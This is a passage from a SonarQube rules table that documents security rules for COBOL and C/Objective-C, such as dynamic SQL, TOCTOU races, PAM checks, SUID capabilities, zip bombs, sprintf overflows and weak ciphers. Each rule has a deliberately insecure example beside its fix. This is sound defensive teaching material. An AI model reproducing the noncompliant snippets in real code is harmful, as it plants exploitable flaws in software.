<ul><li> The whole table is not required. </li><li> The table contains sensitive information. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Add a &#34;WHERE&#34; condition to &#34;SELECT&#34; statements.</p>
<h2>Sensitive Code Example</h2>
<pre>
SELECT * FROM db_persons INTO us_persons
</pre>
<h2>Compliant Solution</h2>
<pre>
SELECT * FROM db_persons INTO us_persons WHERE country IS &#39;US&#39;
</pre>
<h2>Exceptions</h2>
<p>Not having a WHERE clause is acceptable in read-only cursors as results are generally sorted and it is possible to stop processing in the
middle.</p>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cobol:SQL.DynamicSqlCheck">
              cobol:SQL.DynamicSqlCheck
            </a>
          </td>
          <td>
            <details>
              <p>It is a bad practice to use Dynamic SQL. It differs from static embedded SQL in that part or all of the actual SQL commands may be stored in a host
variable that is built on the fly during execution of the program. In the extreme case, the SQL commands are generated in their entirety by the
application program at run time. While dynamic SQL is more flexible than static embedded SQL, it does require additional overhead and is much more
difficult to understand and to maintain.</p>
<p>Moreover, dynamic SQL may expose the application to SQL injection vulnerabilities.</p>
<p>This rule raises an issue when <code>PREPARE</code> or <code>EXECUTE IMMEDIATE</code> is used.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The SQL statement can be written without dynamic clauses. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Do not use dynamic clauses in &#34;SELECT&#34; statements.</p>
<h2>Sensitive Code Example</h2>
<pre>
EXEC SQL PREPARE SEL INTO :SQLDA FROM :STMTBUF END-EXEC.
</pre>
<h2>Compliant Solution</h2>
<pre>
EXEC SQL SELECT * FROM tableName END-EXEC.
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/89" rel="nofollow">MITRE, CWE-89</a> - SQL Injection </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS Top 25</a> - Insecure Interaction Between Components </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cobol:S1686">
              cobol:S1686
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Defining a subprogram to be called at runtime is possible but ill-advised. This extremely powerful feature can quite easily be misused, and even
when used correctly, it highly increases the overall complexity of the program, and makes it impossible before runtime to know exactly what will be
executed. Therefore defining the subprogram to be called at runtime is a feature that should be avoided.</p>
<h3>Noncompliant code example</h3>
<pre>
MOVE SOMETHING TO MY_SUBPROG.
...
CALL MY_SUBPROG.
</pre>
<h3>Compliant solution</h3>
<pre>
01 MY_SUBPROG PIC X(10) VALUE &#34;SUB123&#34;.
....
CALL MY_SUBPROG.
</pre>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cobol:S1685">
              cobol:S1685
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href="/organizations/sopra-steria/rules?open&#61;cobol%3AS4507&amp;rule_key&#61;cobol%3AS4507" rel="nofollow">S4507</a> instead.</p>
<h2>Why is this an issue?</h2>
<p>Debug statements (ones with &#39;D&#39; or &#39;d&#39; in the indicator area) should not be executed in production, but the <code>WITH DEBUGGING MODE</code> clause
activates all debug lines, which could expose sensitive information to attackers. Therefore the <code>WITH DEBUGGING MODE</code> clause should be
removed.</p>
<h3>Noncompliant code example</h3>
<pre>
SOURCE-COMPUTER. IBM-370 WITH DEBUGGING MODE.
</pre>
<h3>Compliant solution</h3>
<pre>
SOURCE-COMPUTER. IBM-370.
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/489" rel="nofollow">MITRE, CWE-489</a> - Active Debug Code </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cobol:COBOL.DisplayStatementUsageCheck">
              cobol:COBOL.DisplayStatementUsageCheck
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>The <code>DISPLAY</code> statement outputs data to standard out or some other destination and could reveal sensitive information. Therefore, it
should be avoided.</p>
<h3>Noncompliant code example</h3>
<pre>
DISPLAY &#34;hello world&#34;  *&gt; Noncompliant
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/489" rel="nofollow">MITRE, CWE-489</a> - Active Debug Code </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=objc:S5982">
              objc:S5982
            </a>
          </td>
          <td>
            <details>
              <p>The purpose of changing the current working directory is to modify the base path when the process performs relative path resolutions. When the
working directory cannot be changed, the process keeps the directory previously defined as the active working directory. Thus, verifying the success
of chdir() type of functions is important to prevent unintended relative paths and unauthorized access.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The success of changing the working directory is relevant for the application. </li><li> Changing the working directory is required by chroot to make the new root effective. </li><li> Subsequent disk operations are using relative paths. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>After changing the current working directory verify the success of the operation and handle errors.</p>
<h2>Sensitive Code Example</h2>
<p>The <code>chdir</code> operation could fail and the process still has access to unauthorized resources. The return code should be verified:</p>
<pre>
const char* any_dir &#61; &#34;/any/&#34;;
chdir(any_dir); // Sensitive: missing check of the return value

int fd &#61; open(any_dir, O_RDONLY | O_DIRECTORY);
fchdir(fd); // Sensitive: missing check of the return value
</pre>
<h2>Compliant Solution</h2>
<p>Verify the return code of <code>chdir</code> and handle errors:</p>
<pre>
const char* root_dir &#61; &#34;/jail/&#34;;
if (chdir(root_dir) &#61;&#61; -1) {
  exit(-1);
} // Compliant

int fd &#61; open(any_dir, O_RDONLY | O_DIRECTORY);
if(fchdir(fd) &#61;&#61; -1) {
  exit(-1);
} // Compliant
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A5-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> -
  Broken Access Control </li><li> <a href="https://cwe.mitre.org/data/definitions/252" rel="nofollow">MITRE, CWE-252</a> - Unchecked Return Value </li><li> <a href="https://man7.org/linux/man-pages/man2/chdir.2.html" rel="nofollow">man7.org</a> - chdir </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=objc:S5832">
              objc:S5832
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Pluggable authentication module (PAM) is a mechanism used on many unix variants to provide a unified way to authenticate users, independently of
the underlying authentication scheme.</p>
<p>When authenticating users, it is strongly recommended to check the validity of the account (not locked, not expired …​), otherwise it leads to
unauthorized access to resources.</p>
<h3>Noncompliant code example</h3>
<p>The account validity is not checked with <code>pam_acct_mgmt</code> when authenticating a user with <code>pam_authenticate</code>:</p>
<pre>
int valid(pam_handle_t *pamh) {
    if (pam_authenticate(pamh, PAM_DISALLOW_NULL_AUTHTOK) !&#61; PAM_SUCCESS) { // Noncompliant - missing pam_acct_mgmt
        return -1;
    }

    return 0;
}
</pre>
<p>The return value of <code>pam_acct_mgmt</code> is not checked:</p>
<pre>
int valid(pam_handle_t *pamh) {
    if (pam_authenticate(pamh, PAM_DISALLOW_NULL_AUTHTOK) !&#61; PAM_SUCCESS) {
        return -1;
    }
    pam_acct_mgmt(pamh, 0); // Noncompliant
    return 0;
}
</pre>
<h3>Compliant solution</h3>
<p>When authenticating a user with <code>pam_authenticate</code>, check the account validity with <code>pam_acct_mgmt</code>:</p>
<pre>
int valid(pam_handle_t *pamh) {
    if (pam_authenticate(pamh, PAM_DISALLOW_NULL_AUTHTOK) !&#61; PAM_SUCCESS) {
        return -1;
    }
    if (pam_acct_mgmt(pamh, 0) !&#61; PAM_SUCCESS) { // Compliant
        return -1;
    }
    return 0;
}
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A5-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> -
  Broken Access Control </li><li> <a href="https://cwe.mitre.org/data/definitions/304" rel="nofollow">MITRE, CWE-304</a> - Missing Critical Step in Authentication </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=objc:S5847">
              objc:S5847
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>&#34;Time Of Check to Time Of Use&#34; (TOCTOU) vulnerabilities occur when an application:</p>
<ul><li> First, checks permissions or attributes of a file: for instance, is a file a symbolic link? </li><li> Next, performs some operations such as writing data to this file. </li></ul>
<p>The application cannot assume the state of the file is unchanged between these two steps, there is a race condition (ie: two different processes
can access and modify the same shared object/file at the same time, which can lead to privilege escalation, denial of service and other unexpected
results).</p>
<p>For instance, attackers can benefit from this situation by creating a symbolic link to a sensitive file directly after the first step (eg in Unix:
<code>/etc/passwd</code>) and try to elevate their privileges (eg: if the written data has the correct <code>/etc/passwd</code> file format).</p>
<p>To avoid TOCTOU vulnerabilities, one possible solution is to do a single atomic operation for the &#34;check&#34; and &#34;use&#34; actions, therefore removing the
race condition window. Another possibility is to use file descriptors. This way the binding of the file descriptor to the file cannot be changed by a
concurrent process.</p>
<h3>Noncompliant code example</h3>
<p>A &#34;check function&#34; (for instance <code>access</code>, <code>stat</code> …​ in this case <code>access</code> to verify the existence of a file) is
used, followed by a &#34;use function&#34; (<code>open</code>, <code>fopen</code> …​) to write data inside a non existing file. These two consecutive calls
create a TOCTOU race condition:</p>
<pre>
#include &lt;stdio.h&gt;

void fopen_with_toctou(const char *file) {
  if (access(file, F_OK) &#61;&#61; -1 &amp;&amp; errno &#61;&#61; ENOENT) {
    // the file doesn&#39;t exist
    // it is now created in order to write some data inside
    FILE *f &#61; fopen(file, &#34;w&#34;); // Noncompliant: a race condition window exist from access() call to fopen() call calls
    if (NULL &#61;&#61; f) {
      /* Handle error */
    }

    if (fclose(f) &#61;&#61; EOF) {
      /* Handle error */
    }
  }
}
</pre>
<h3>Compliant solution</h3>
<p>If the file already exists on the disk, <code>fopen</code> with <code>x</code> mode will fail:</p>
<pre>
#include &lt;stdio.h&gt;

void open_without_toctou(const char *file) {
  FILE *f &#61; fopen(file, &#34;wx&#34;); // Compliant
  if (NULL &#61;&#61; f) {
    /* Handle error */
  }
  /* Write to file */
  if (fclose(f) &#61;&#61; EOF) {
    /* Handle error */
  }
}
</pre>
<p>A more generic solution is to use &#34;file descriptors&#34;:</p>
<pre>
void open_without_toctou(const char *file) {
  int fd &#61; open(file, O_CREAT | O_EXCL | O_WRONLY);
  if (-1 !&#61; fd) {
    FILE *f &#61; fdopen(fd, &#34;w&#34;);  // Compliant
  }
}
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://cwe.mitre.org/data/definitions/367" rel="nofollow">MITRE, CWE-367</a> - Time-of-check Time-of-use (TOCTOU) Race Condition </li><li> <a href="https://wiki.sei.cmu.edu/confluence/display/c/FIO45-C.&#43;Avoid&#43;TOCTOU&#43;race&#43;conditions&#43;while&#43;accessing&#43;files" rel="nofollow">CERT, FIO45-C.</a> - Avoid
  TOCTOU race conditions while accessing files </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=objc:S5849">
              objc:S5849
            </a>
          </td>
          <td>
            <details>
              <p>Setting capabilities can lead to privilege escalation.</p>
<p>Linux capabilities allow you to assign narrow slices of <code>root</code>&#39;s permissions to files or processes. A thread with capabilities bypasses
the normal kernel security checks to execute high-privilege actions such as mounting a device to a directory, without requiring (additional) root
privileges.</p>
<h2>Ask Yourself Whether</h2>
<p>Capabilities are granted:</p>
<ul><li> To a process that does not require all capabilities to do its job. </li><li> To a not trusted process. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Capabilities are high privileges, traditionally associated with superuser (root), thus make sure that the most restrictive and necessary
capabilities are assigned to files and processes.</p>
<h2>Sensitive Code Example</h2>
<p>When setting capabilities:</p>
<pre>
cap_t caps &#61; cap_init();
cap_value_t cap_list[2];
cap_list[0] &#61; CAP_FOWNER;
cap_list[1] &#61; CAP_CHOWN;
cap_set_flag(caps, CAP_PERMITTED, 2, cap_list, CAP_SET);

cap_set_file(&#34;file&#34;, caps); // Sensitive
cap_set_fd(fd, caps); // Sensitive
cap_set_proc(caps); // Sensitive
capsetp(pid, caps); // Sensitive
capset(hdrp, datap); // Sensitive: is discouraged to be used because it is a system call
</pre>
<p>When setting SUID/SGID attributes:</p>
<pre>
chmod(&#34;file&#34;, S_ISUID|S_ISGID); // Sensitive
fchmod(fd, S_ISUID|S_ISGID); // Sensitive
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://cwe.mitre.org/data/definitions/250" rel="nofollow">MITRE, CWE-250</a> - Execution with Unnecessary Privileges </li><li> <a href="https://cwe.mitre.org/data/definitions/266" rel="nofollow">MITRE, CWE-266</a> - Incorrect Privilege Assignment </li><li> <a href="https://forums.grsecurity.net/viewtopic.php?f&#61;7&amp;t&#61;2522" rel="nofollow">False Boundaries and Arbitrary Code Execution</a> </li><li> <a href="https://man7.org/linux/man-pages/man7/capabilities.7.html" rel="nofollow">Linux manual page</a> - capabilities(7) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=objc:S5042">
              objc:S5042
            </a>
          </td>
          <td>
            <details>
              <p>Successful Zip Bomb attacks occur when an application expands untrusted archive files without controlling the size of the expanded data, which can
lead to denial of service. A Zip bomb is usually a malicious archive file of a few kilobytes of compressed data but turned into gigabytes of
uncompressed data. To achieve this extreme <a href="https://en.wikipedia.org/wiki/Data_compression_ratio" rel="nofollow">compression ratio</a>, attackers will
compress irrelevant data (eg: a long string of repeated bytes).</p>
<h2>Ask Yourself Whether</h2>
<p>Archives to expand are untrusted and:</p>
<ul><li> There is no validation of the number of entries in the archive. </li><li> There is no validation of the total size of the uncompressed data. </li><li> There is no validation of the ratio between the compressed and uncompressed archive entry. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Define and control the threshold for maximum total size of the uncompressed data. </li><li> Count the number of file entries extracted from the archive and abort the extraction if their number is greater than a predefined threshold, in
  particular it’s not recommended to recursively expand archives (an entry of an archive could be also an archive). </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
#include &lt;archive.h&gt;
#include &lt;archive_entry.h&gt;
// ...

void f(const char *filename, int flags) {
  struct archive_entry *entry;
  struct archive *a &#61; archive_read_new();
  struct archive *ext &#61; archive_write_disk_new();
  archive_write_disk_set_options(ext, flags);
  archive_read_support_format_tar(a);

  if ((archive_read_open_filename(a, filename, 10240))) {
    return;
  }

  for (;;) {
    int r &#61; archive_read_next_header(a, &amp;entry);
    if (r &#61;&#61; ARCHIVE_EOF) {
      break;
    }
    if (r !&#61; ARCHIVE_OK) {
      return;
    }
  }
  archive_read_close(a);
  archive_read_free(a);

  archive_write_close(ext);
  archive_write_free(ext);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
#include &lt;archive.h&gt;
#include &lt;archive_entry.h&gt;
// ...

int f(const char *filename, int flags) {
  const int max_number_of_extraced_entries &#61; 1000;
  const int64_t max_file_size &#61; 1000000000; // 1 GB

  int number_of_extraced_entries &#61; 0;
  int64_t total_file_size &#61; 0;

  struct archive_entry *entry;
  struct archive *a &#61; archive_read_new();
  struct archive *ext &#61; archive_write_disk_new();
  archive_write_disk_set_options(ext, flags);
  archive_read_support_format_tar(a);
  int status &#61; 0;

  if ((archive_read_open_filename(a, filename, 10240))) {
    return -1;
  }

  for (;;) {
    number_of_extraced_entries&#43;&#43;;
    if (number_of_extraced_entries &gt; max_number_of_extraced_entries) {
      status &#61; 1;
      break;
    }

    int r &#61; archive_read_next_header(a, &amp;entry);
    if (r &#61;&#61; ARCHIVE_EOF) {
      break;
    }
    if (r !&#61; ARCHIVE_OK) {
      status &#61; -1;
      break;
    }

    int file_size &#61; archive_entry_size(entry);
    total_file_size &#43;&#61; file_size;
    if (total_file_size &gt; max_file_size) {
      status &#61; 1;
      break;
    }
  }
  archive_read_close(a);
  archive_read_free(a);

  archive_write_close(ext);
  archive_write_free(ext);

  return status;
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A6-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> -
  Security Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/409" rel="nofollow">MITRE, CWE-409</a> - Improper Handling of Highly Compressed Data (Data Amplification)
  </li><li> <a href="https://wiki.sei.cmu.edu/confluence/display/java/IDS04-J.&#43;Safely&#43;extract&#43;files&#43;from&#43;ZipInputStream" rel="nofollow">CERT, IDS04-J.</a> - Safely
  extract files from ZipInputStream </li><li> <a href="https://www.bamsoftware.com/hacks/zipbomb/" rel="nofollow">bamsoftware.com</a> - A better Zip Bomb </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=objc:S6069">
              objc:S6069
            </a>
          </td>
          <td>
            <details>
              <p>When using <code>sprintf</code> , it’s up to the developer to make sure the size of the buffer to be written to is large enough to avoid buffer
overflows. Buffer overflows can cause the program to crash at a minimum. At worst, a carefully crafted overflow can cause malicious code to be
executed.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> if the provided buffer is large enough for the result of any possible call to the <code>sprintf</code> function (including all possible format
  strings and all possible additional arguments). </li></ul>
<p>There is a risk if you answered no to the above question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>There are fundamentally safer alternatives. <code>snprintf</code> is one of them. It takes the size of the buffer as an additional argument,
preventing the function from overflowing the buffer.</p>
<ul><li> Use <code>snprintf</code> instead of <code>sprintf</code>. The slight performance overhead can be afforded in a vast majority of projects.
  </li><li> Check the buffer size passed to <code>snprintf</code>. </li></ul>
<p>If you are working in C&#43;&#43;, other safe alternative exist:</p>
<ul><li> <code>std::string</code> should be the prefered type to store strings </li><li> You can format to a string using <code>std::ostringstream</code> </li><li> Since C&#43;&#43;20, <code>std::format</code> is also available to format strings </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
sprintf(str, &#34;%s&#34;, message);   // Sensitive: &#96;str&#96; buffer size is not checked and it is vulnerable to overflows
</pre>
<h2>Compliant Solution</h2>
<pre>
snprintf(str, sizeof(str), &#34;%s&#34;, message); // Prevent overflows by enforcing a maximum size for &#96;str&#96; buffer
</pre>
<h2>Exceptions</h2>
<p>It is a very common and acceptable pattern to compute the required size of the buffer with a call to <code>snprintf</code> with the same arguments
into an empty buffer (this will fail, but return the necessary size), then to call <code>sprintf</code> as the bound check is not needed anymore. Note
that 1 needs to be added by the size reported by <code>snprintf</code> to account for the terminal null character.</p>
<pre>
size_t buflen &#61; snprintf(0, 0, &#34;%s&#34;, message);
char* buf &#61; malloc(buflen &#43; 1); // For the final 0
sprintf(buf, &#34;%s&#34;, message);{code}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/" rel="nofollow">OWASP Top 10 2021 Category A6</a> - Vulnerable and Outdated
  Components </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities" rel="nofollow">OWASP Top 10 2017 Category
  A9</a> - Using Components with Known Vulnerabilities </li><li> <a href="https://cwe.mitre.org/data/definitions/676" rel="nofollow">MITRE, CWE-676</a> - Use of Potentially Dangerous Function </li><li> <a href="https://cwe.mitre.org/data/definitions/119" rel="nofollow">MITRE, CWE-119</a> - Improper Restriction of Operations within the Bounds of a Memory
  Buffer </li><li> <a href="https://www.sans.org/top25-software-errors/#cat2" rel="nofollow">SANS Top 25</a> - Risky Resource Management </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=objc:S5547">
              objc:S5547
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible that the cleartext of the encrypted message might be recoverable without prior knowledge of the key.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communication in various domains. They are used for
several important reasons:</p>
<ul><li> Confidentiality, privacy, and intellectual property protection. </li><li> Security during transmission or on storage devices. </li><li> Data integrity, general trust, and authentication. </li></ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol><li> No encryption is unbreakable. </li><li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li></ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<h3>What is the potential impact?</h3>
<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Theft of sensitive data</h4>
<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>
<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>
<h4>Additional attack surface</h4>
<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted
values are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>
<h2>How to fix it in Botan</h2>
<h3>Code examples</h3>
<p>The following code contains examples of algorithms that are not considered highly resistant to cryptanalysis and thus should be avoided.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
#include &lt;botan/cipher_mode.h&gt;

void encrypt() {
  Botan::Cipher_Mode::create(&#34;DES/CBC/PKCS7&#34;, Botan::ENCRYPTION); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
#include &lt;botan/cipher_mode.h&gt;

void encrypt() {
  Botan::Cipher_Mode::create(&#34;AES-256/GCM&#34;, Botan::ENCRYPTION);
}
</pre>
<h3>How does this work?</h3>
<h4>Use a secure algorithm</h4>
<p>It is highly recommended to use an algorithm that is currently considered secure by the cryptographic community. A common choice for such an
algorithm is the Advanced Encryption Standard (AES).</p>
<p>For block ciphers, it is not recommended to use algorithms with a block size that is smaller than 128 bits.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> <a href="https://botan.randombit.net/handbook/" rel="nofollow">Botan</a> - Handbook </li><li> <a href="https://www.feistyduck.com/books/openssl-cookbook/" rel="nofollow">OpenSSL</a> - Cookbook </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=objc:S5542">
              objc:S5542
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul><li> Confidentiality, privacy, and intellectual property protection </li><li> Security during transmission or on storage devices </li><li> Data integrity, general trust, and authentication </li></ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol><li> No encryption is unbreakable. </li><li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li></ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<p>For AES, the weakest modes are CBC (Cipher Block Chaining) and ECB</p>
<p>(Electronic Codebook), as they are either vulnerable to padding oracles or do not provide authentication mechanisms.</p>
<p>And for RSA, the weakest algorithms are either using it without padding or using the PKCS1v1.5 padding scheme.</p>
<h3>What is the potential impact?</h3>
<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>
<p>Below are some real-world scenarios that illustrate possible impacts of an attacker exploiting the vulnerability.</p>
<h4>Theft of sensitive data</h4>
<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>
<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>
<h4>Additional attack surface</h4>
<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted
values are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>
<h2>How to fix it in Botan</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<p>Example with a symmetric cipher, AES:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
#include &lt;botan/cipher_mode.h&gt;

void encrypt() {
  Botan::Cipher_Mode::create(&#34;AES-256/ECB&#34;, Botan::ENCRYPTION); // Noncompliant
}
</pre>
<p>Example with an asymmetric cipher, RSA:</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
#include &lt;botan/rng.h&gt;
#include &lt;botan/auto_rng.h&gt;
#include &lt;botan/rsa.h&gt;
#include &lt;botan/pubkey.h&gt;

void encrypt() {
  std::unique_ptr&lt;Botan::RandomNumberGenerator&gt;   rng(new Botan::AutoSeeded_RNG);
  Botan::RSA_PrivateKey                           rsaKey(*rng.get(), 2048);

  Botan::PK_Encryptor_EME(rsaKey, *rng.get(), &#34;PKCS1v15&#34;); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<p>For the AES symmetric cipher, use the GCM mode:</p>
<pre data-diff-id="1" data-diff-type="compliant">
#include &lt;botan/cipher_mode.h&gt;

void encrypt() {
  Botan::Cipher_Mode::create(&#34;AES-256/GCM&#34;, Botan::ENCRYPTION);
}
</pre>
<p>For the RSA asymmetric cipher, use the Optimal Asymmetric Encryption Padding (OAEP):</p>
<pre data-diff-id="2" data-diff-type="compliant">
#include &lt;botan/rng.h&gt;
#include &lt;botan/auto_rng.h&gt;
#include &lt;botan/rsa.h&gt;
#include &lt;botan/pubkey.h&gt;

void encrypt() {
  std::unique_ptr&lt;Botan::RandomNumberGenerator&gt;   rng(new Botan::AutoSeeded_RNG);
  Botan::RSA_PrivateKey                           rsaKey(*rng.get(), 2048);

  Botan::PK_Encryptor_EME(rsaKey, *rng.get(), &#34;OAEP&#34;);
}
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic community.</p>
<p>Appropriate choices are currently the following.</p>
<h4>For AES: Use Galois/Counter mode (GCM)</h4>
<p>GCM mode combines encryption with authentication and integrity checks using a cryptographic hash function and provides both confidentiality and
authenticity of data.</p>
<p>Other similar modes are:</p>
<ul><li> CCM: <code>Counter with CBC-MAC</code> </li><li> CWC: <code>Cipher Block Chaining with Message Authentication Code</code> </li><li> EAX: <code>Encrypt-and-Authenticate</code> </li><li> IAPM: <code>Integer Authenticated Parallelizable Mode</code> </li><li> OCB: <code>Offset Codebook Mode</code> </li></ul>
<p>It is also possible to use AES-CBC with HMAC for integrity checks. However, it</p>
